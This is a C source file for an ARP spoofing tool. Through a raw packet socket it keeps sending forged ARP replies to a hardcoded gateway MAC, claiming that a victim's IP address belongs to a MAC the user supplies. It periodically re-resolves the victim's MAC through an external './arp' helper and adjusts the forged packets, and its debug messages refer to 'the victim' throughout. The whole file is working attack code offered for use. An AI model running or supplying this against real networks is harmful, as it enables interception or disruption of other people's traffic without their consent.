#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include "common.h"
#define DEBUG

int main(int c, char *z[])
{
	int	packet_socket;
	errn1(packet_socket = socket(AF_PACKET, SOCK_RAW, rev2(0x0806)), "socket error");
	struct sockaddr_ll	sa_ll;
	sa_ll.sll_family = AF_PACKET, sa_ll.sll_halen = 6, sa_ll.sll_ifindex = get_ifindex(packet_socket, "eth0");
	char	gate[] = "\x00\xe0\xfc\x6a\xa6\xd0";
	int	i;
	for (i=0;i<6;i++)
		sa_ll.sll_addr[i] = gate[i];
	char	msg[1514], mac_src[6];
	conv_mac(z[2], mac_src);
	int	len = mk_arp_reply_packet(msg, gate, mac_src, 0, conv_ip(z[1]), 1);
	struct timespec	t;
	int	cnt, packet_sent = 0, cnt_no_arp = 0;
	sscanf(z[3], "%d", &cnt);
	t.tv_sec = 0, t.tv_nsec = 1000000000/cnt;
	while (1) {
		errn1(sendto(packet_socket, msg, len, 0, (struct sockaddr*)&sa_ll, sizeof(struct sockaddr_ll)), "sendto error");
		packet_sent++;
		while (packet_sent == 60 * cnt) {
			#ifdef DEBUG
			puts("going to get fresh mac address of the victim");
			#endif
			int	pipefd[2];
			errn1(pipe(pipefd), "pipe error");
			pid_t	pid;
			errn1(pid = fork(), "fork failed");
			if (!pid) {
				ok0(close(pipefd[0]), "close error");
				errn1(dup2(pipefd[1], 1), "dup2 failed");
				char	*argv[] = {"./arp", z[1], NULL}, *envp[] = {NULL};
				errn1(execve("./arp", argv, envp), "execve error");
			}
			ok0(close(pipefd[1]), "close error");
			char	ans[12+5+1];
			int	size;
			errn1(size = read(pipefd[0], ans, 12+5+1), "read error");
			close(pipefd[0]);
			errn1(wait(NULL), "wait failed");
			if (size == 12+5+1) {
				#ifdef DEBUG
				puts("arp reply received, checking if the victim has changed its mac address");
				#endif
				char	new_mac[6];
				conv_mac(ans, new_mac);
				int	i;
				for (i=0;i<6;i++)
					if (new_mac[i] != msg[6+i])
						break;
				#ifdef DEBUG
				if (i<6)
					puts("yes, its mac address has changed, adjusting...");
				#endif
				while (i<6)
					msg[6+i]=msg[22+i]=msg[32+i]=new_mac[i], i++;
				packet_sent=0, cnt_no_arp=0;
			} else
				if (cnt_no_arp == 120) {
					#ifdef DEBUG
					puts("arp reply not received for a significant time, going to sleep...");
					#endif
					sleep(60);
				}
				else
					cnt_no_arp++, packet_sent=0;
		}
		nanosleep(&t, NULL);
	}
}
